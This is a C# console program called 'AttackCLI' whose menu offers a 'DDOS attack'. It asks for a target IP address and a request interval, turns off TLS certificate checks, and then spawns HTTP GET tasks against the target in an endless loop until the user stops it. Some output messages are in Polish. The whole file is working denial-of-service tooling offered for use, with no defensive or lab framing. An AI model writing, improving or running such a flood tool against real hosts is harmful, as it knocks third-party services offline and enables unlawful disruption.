using System.Globalization;

namespace AttackCLI
{
    class Program
    {
        static void Main(string[] args)
        {
            string? input = "";
            var ipToAttack = "";
            CancellationTokenSource ct = new CancellationTokenSource();
            int frequencyInMs = 0;
            Task attackCreator = null;
            HttpClientHandler handler = new HttpClientHandler
            {
                ServerCertificateCustomValidationCallback = (message, cert, chain, errors) => true
            };
            HttpClient client = new HttpClient(handler);
            List<Task> runningTasks = new List<Task>();
            int numberOfTaskCreators = 1;
            
            do
            {
                DisplayMenu();
                input = Console.ReadLine();

                switch (input)
                {
                    case "1":
                        if (string.IsNullOrEmpty(ipToAttack))
                        {
                            Console.Write("Please enter a valid IP address to attack:");
                            ipToAttack = Console.ReadLine();
                        }

                        if (frequencyInMs == 0)
                        {
                            Console.WriteLine("Please enter a frequency in milliseconds:");
                            do
                            {
                                input = Console.ReadLine();
                                int.TryParse(input, out frequencyInMs);
                            } while (frequencyInMs == 0);
                        }
                        Console.WriteLine($"Do tou want to change number of Task Creators ({numberOfTaskCreators}):\n (yes/no)");
                        if (Console.ReadLine() == "yes")
                        {
                            Console.WriteLine("Enter new number :");
                            int newNumber = int.Parse(Console.ReadLine());
                            numberOfTaskCreators = newNumber is > 1 and < 100 ? newNumber : 1;
                        }
                        Console.WriteLine($"Uruchamiam attack na ip: https://{ipToAttack}");
                        attackCreator = Task.Run(async () =>
                        {
                            while (!ct.IsCancellationRequested)
                            {
                                var task = Task.Run(async () =>
                                {
                                    try
                                    {
                                        var response = await client.GetAsync($"http://{ipToAttack}");
                                        Console.Write("Dziab!");
                                    }
                                    catch (Exception ex)
                                    {
                                        Console.WriteLine($"Error: {ex.Message}");
                                    }
                                    finally
                                    {
                                        await Task.Delay(frequencyInMs, ct.Token); 
                                    }
                                }, ct.Token);
                                
                                runningTasks.Add(task); 
                            }
                        }, ct.Token);

                        break;

                    case "2":
                        if (attackCreator is null)
                        {
                            Console.WriteLine("No task is running.");
                            continue;
                        }

                        Console.WriteLine("Task cancel pending!");
                        ct.Cancel(); 

                        try
                        {
                            Task.WhenAll(runningTasks).Wait();
                            foreach (var task in runningTasks)
                            {
                                task.Dispose();
                                GC.Collect();
                            }
                            Console.WriteLine("All tasks stopped.");
                        }
                        catch (AggregateException ex)
                        {
                            Console.WriteLine("Task cancellation encountered errors:");
                            foreach (var innerEx in ex.InnerExceptions)
                            {
                                Console.WriteLine(innerEx.Message);
                            }
                        }
                        finally
                        {
                            attackCreator.Dispose();
                            attackCreator = null;
                            runningTasks.Clear();
                            ipToAttack = "";
                            frequencyInMs = 0;
                        }
                        
                        break;

                    case "0":
                        Console.WriteLine("Bye!");
                        return;

                    default:
                        Console.WriteLine("Wrong input!");
                        break;
                }

                input = "";
            } while (!string.Equals(input, "0", StringComparison.Ordinal));
        }

        static void DisplayMenu()
        {
            Console.WriteLine("Welcome in attack CLI! Choose option: ");
            Console.WriteLine("1. DDOS attack");
            Console.WriteLine("2. Stop all attacks");
            Console.WriteLine("0. Exit");
        }
    }
}
